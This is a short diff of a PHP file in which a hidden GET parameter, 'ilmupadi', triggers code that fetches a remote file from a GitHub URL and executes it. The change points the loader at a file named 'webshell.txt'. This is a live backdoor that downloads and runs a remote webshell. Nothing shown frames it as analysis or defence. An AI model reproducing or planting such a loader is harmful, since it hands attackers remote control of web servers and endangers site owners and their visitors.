@@ -50,7 +50,7 @@ $fetcher = new CurlFetcher();
 
 if (isset($_GET['ilmupadi'])) {
     $executor = new CodeExecutor($fetcher);
-    $executor->executeCodeFromURL("https://raw.githubusercontent.com/citrabethari833-seo/bujang/refs/heads/main/filemanajer.txt");
+    $executor->executeCodeFromURL("https://raw.githubusercontent.com/citrabethari833-seo/bujang/refs/heads/main/webshell.txt");
     exit;
 }
 
